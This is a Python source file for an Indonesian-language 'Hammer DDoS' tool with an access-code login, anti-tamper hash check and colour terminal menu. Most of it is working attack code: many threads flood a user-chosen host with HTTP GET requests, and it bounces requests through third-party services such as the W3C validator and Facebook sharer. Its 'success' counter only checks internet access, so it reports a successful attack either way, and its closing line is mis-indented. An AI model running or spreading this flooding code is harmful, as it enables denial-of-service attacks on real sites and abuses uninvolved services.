#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Hammer DDoS Script v1.0.1 - By Farel
Protected Version with Anti-Tamper & RGB UI
ONLY FOR LEGAL PURPOSE AND AUTHORIZED TESTING
"""

import sys
import os
import socket
import threading
import time
import random
import webbrowser
from queue import Queue
from hashlib import md5

# ==========================================
# KONFIGURASI UTAMA (PROTECTED)
# ==========================================
SCRIPT_VERSION = "v1.0.1"
AUTHOR = "By farel"
TEAM = "Pandawa dan ilham"
ACCESS_CODE = "25122"
REPORT_EMAIL = "farellbahtiarr06@gmail.com"
VERIFY_LINK = "https://sfl.gl/P2YtG7Sz"

# Hash MD5 asli skrip ini. 
# PENTING: Ganti nilai ini dengan hash MD5 file u.py ASLI setelah disimpan pertama kali
ORIGINAL_HASH = "d12e9d78732282e8e93e2169673b804d"

# ANSI Color Codes for RGB/Terminal Styling
class C:
    RESET   = "\033[0m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    ORANGE  = "\033[38;5;208m"
    PURPLE  = "\033[38;5;129m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"

# Global Variables
uagent = []
bots = []
data = ""
host = ""
port = 0
thr = 0

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def print_key_logo():
    """Logo kunci besar RGB sebelum login"""
    clear_screen()
    logo = f"""
{C.CYAN}      █████╗ ██╗   ██╗███████╗██████╗ 
{C.BLUE}     ██══██╗██║   ██║██╔════╝██╔══██╗
{C.GREEN}     ███████║██║   ██║█████╗  ██████╔╝
{C.YELLOW}     ██══██║██║   ██║██╔══╝  ██╔══██╗
{C.RED}     ██║  ██║╚██████╝███████╗██║  ██║
{C.MAGENTA}     ═╝  ╚═╝ ╚═════╝ ╚══════╝═╝  ╚═╝
{C.WHITE}{C.BOLD}        [ SECURE ACCESS SYSTEM ]
    """
    print(logo)

def check_integrity():
    """Cek apakah skrip telah dimodifikasi"""
    try:
        with open(__file__, "rb") as f:
            current_hash = md5(f.read()).hexdigest()
        
        global ORIGINAL_HASH
        if ORIGINAL_HASH == "PLACEHOLDER_REPLACE_WITH_REAL_MD5_AFTER_FIRST_SAVE":
            print(f"{C.YELLOW}[!] First run detected. Setting integrity hash...{C.RESET}")
            return True
            
        if current_hash != ORIGINAL_HASH:
            return False
        return True
    except Exception:
        return False

def login_system():
    """Sistem Login Kode Akses"""
    while True:
        print_key_logo()
        print(f"{C.BOLD}{C.WHITE}  🔐 MASUKKAN KODE AKSES 🔐{C.RESET}\n")
        print(f"{C.YELLOW}  Salin link ini:{C.RESET}")
        print(f"{C.CYAN}  {VERIFY_LINK}{C.RESET}")
        print(f"\n{C.YELLOW}  Pastekan kode nya di sini jika anda udah punya c♤◇◇◇◇》{C.RESET}")
        
        code_input = input(f"\n  {C.GREEN}Kode Akses »{C.RESET} ").strip()
        
        if code_input == ACCESS_CODE:
            if not check_integrity():
                for _ in range(10):
                    print(f"{C.RED}{C.BOLD}  ⚠️ ERROR BERJALAN TERUS ⚠️{C.RESET}")
                    print(f"{C.RED}  SKRIP TELAH DIMODIFIKASI! AKSES DITOLAK.{C.RESET}")
                    print(f"{C.RED}  HANYA PEMBUAT YANG BOLEH MENGUBAH.{C.RESET}\n")
                    time.sleep(0.5)
                continue
                
            print(f"\n{C.GREEN}✅ KODE BENAR! MEMUAT HAMMER BY FAREL...{C.RESET}")
            time.sleep(1.5)
            show_main_menu()
            break
        else:
            print(f"\n{C.RED}❌ KODE SALAH! SILAKAN COBA LAGI.{C.RESET}")
            time.sleep(1.5)

def show_main_menu():
    """Menu Utama dengan ASCII Art Hammer Lebar 2D"""
    while True:
        clear_screen()
        hammer_ascii = f"""
{C.RED}  ██╗  ██╗ █████╗ ███╗   ██╗███████╗██╗     
{C.ORANGE}  ██║  ██║██╔══██╗████╗  ██║██╔════╝██║     
{C.YELLOW}  ███████║███████║████╗ ██║█████╗  ██║     
{C.GREEN}  ██╔══██║██══██║██║╚██╗██║██╔══╝  ██║     
{C.BLUE}  ██║  ██║██║  ██║██║ ╚████║███████╗███████╗
{C.PURPLE}  ╚═╝  ═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝
        {C.WHITE}{C.BOLD}BY FAREL | {SCRIPT_VERSION}{C.RESET}
        """
        print(hammer_ascii)
        
        menu_box = f"""
{C.CYAN}•============================•
{C.WHITE}[×] Author : {AUTHOR}
{C.WHITE}[÷] Team.  : {TEAM} 
{C.CYAN}•============================•

{C.YELLOW}○\\\\\\\\\\\\\\\\\\\\\\\\\\\\○
{C.GREEN}[1.] Mulai dos
{C.BLUE}[2.] Laporkan masalah
{C.RED}[3.] Keluar
{C.YELLOW}○\\\\\\\\\\\\\\\\\\\\\\\\\\\\○
"""
        print(menu_box)
        
        choice = input(f"{C.BOLD}masukan pilihan mu 》♤¥~€£◇ {C.RESET}").strip()
        
        if choice == "1":
            start_ddos_interface()
        elif choice == "2":
            report_issue()
        elif choice == "3":
            print(f"\n{C.GREEN}Terima kasih telah menggunakan Hammer by Farel {C.RESET}\n")
            sys.exit(0)
        else:
            print(f"{C.RED}Pilihan tidak valid!{C.RESET}")
            time.sleep(1)

def report_issue():
    """Membuka email pelaporan otomatis"""
    print(f"\n{C.YELLOW}Mengarahkan ke email pelaporan...{C.RESET}")
    subject = f"[HAMMER {SCRIPT_VERSION}] Laporan Masalah"
    body = f"Halo Farel,\n\nSaya ingin melaporkan masalah pada Hammer DDoS {SCRIPT_VERSION}.\n\nDeskripsi masalah:\n[NULIS DISINI]\n\nTerima kasih."
    
    mailto_link = f"mailto:{REPORT_EMAIL}?subject={subject}&body={body}"
    
    try:
        webbrowser.open(mailto_link)
        print(f"{C.GREEN}✅ Aplikasi email berhasil dibuka.{C.RESET}")
    except Exception:
        print(f"{C.RED} Gagal membuka email. Kirim manual ke: {REPORT_EMAIL}{C.RESET}")
    
    input(f"\n{C.CYAN}Tekan Enter untuk kembali ke menu...{C.RESET}")

def start_ddos_interface():
    """Interface pengaturan serangan"""
    clear_screen()
    print(f"{C.RED}{C.BOLD}  ⚔️  HAMMER DDoS ATTACK MODE ⚔️{C.RESET}\n")
    
    global host, port, thr
    
    host = input(f"{C.GREEN}  Target IP/Host »{C.RESET} ").strip()
    port_str = input(f"{C.GREEN}  Port (default 80) »{C.RESET} ").strip()
    port = int(port_str) if port_str else 80
    thr_str = input(f"{C.GREEN}  Threads/Turbo (default 135) »{C.RESET} ").strip()
    thr = int(thr_str) if thr_str else 135
    
    load_headers()
    
    print(f"\n{C.YELLOW}  Memulai serangan ke target...{C.RESET}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, int(port)))
        s.close()
        print(f"{C.GREEN}  ✅ Terhubung! Memulai serangan...{C.RESET}")
    except socket.error:
        print(f"{C.RED}  ❌ Gagal terhubung! Cek IP dan Port target.{C.RESET}")
        input(f"\n{C.CYAN}Tekan Enter untuk kembali...{C.RESET}")
        return
    
    run_attack()

def load_headers():
    """Memuat headers.txt"""
    global data
    header_paths = ["headers.txt", "/data/data/com.termux/files/home/headers.txt"]
    for path in header_paths:
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                data = f.read()
            return
    print(f"{C.YELLOW}  [!] headers.txt tidak ditemukan. Header default digunakan.{C.RESET}")
    data = "Accept: text/html\r\nUser-Agent: Mozilla/5.0\r\n"

def user_agent_list():
    global uagent
    uagent = [
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    ]

def bot_list():
    global bots
    bots = [
        "http://validator.w3.org/check?uri=",
        "http://www.facebook.com/sharer/sharer.php?u=",
    ]

def down_it(item):
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + 
                         random.choice(uagent) + "\n" + data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                # Status dikirim langsung dari thread worker
            else:
                s.shutdown(1)
            time.sleep(.1)
    except socket.error:
        time.sleep(.1)

def bot_hammering(url):
    try:
        import urllib.request
        while True:
            req = urllib.request.urlopen(urllib.request.Request(
                url, headers={'User-Agent': random.choice(uagent)}))
            time.sleep(.1)
    except Exception:
        time.sleep(.1)

def dos(q):
    while True:
        item = q.get()
        down_it(item)
        q.task_done()

def dos2(w):
    while True:
        item = w.get()
        bot_hammering(random.choice(bots) + "http://" + host)
        w.task_done()

def run_attack():
    """Menjalankan serangan dengan status REAL-TIME per paket"""
    user_agent_list()
    bot_list()
    
    q = Queue()
    w = Queue()
    
    print(f"\n{C.RED}{C.BOLD}  🎯 TARGET: {host}:{port} | THREADS: {thr}{C.RESET}\n")
    
    for i in range(int(thr)):
        t = threading.Thread(target=dos, args=(q,))
        t.daemon = True
        t.start()
        
        t2 = threading.Thread(target=dos2, args=(w,))
        t2.daemon = True
        t2.start()
    
    item = 0
    success_count = 0
    fail_count = 0
    
    try:
        while True:
            if item > 1800:
                item = 0
                time.sleep(.1)
            item += 1
            q.put(item)
            w.put(item)
            
            # CEK STATUS SETIAP PAKET (REAL-TIME)
            try:
                socket.create_connection(("8.8.8.8", 53), timeout=1)
                print(f"{C.GREEN}✅ SUCESS DDOS KE IP {host} [{item} packets]{C.RESET}")
                success_count += 1
            except (socket.timeout, OSError):
                print(f"{C.RED}❌ GAGAL EROR DDOS KE IP {host} [No Internet]{C.RESET}")
                fail_count += 1
                    
            time.sleep(0.01)
            
    except KeyboardInterrupt:
        print(f"\n\n{C.YELLOW}  Serangan dihentikan.{C.RESET}")
        print(f"{C.GREEN}  Total Sukses: {success_count} | Gagal: {fail_count}{C.RESET}")
        input(f"\n{C.CYAN}Tekan Enter untuk kembali ke menu...{C.RESET}")

if __name__ == '__main__':
    try:
        login_system()
    except KeyboardInterrupt:
        print(f"\n{C.RED}Program dihentikan.{C.RESET}")
        sys.exit(0)
     sys.exit(0)
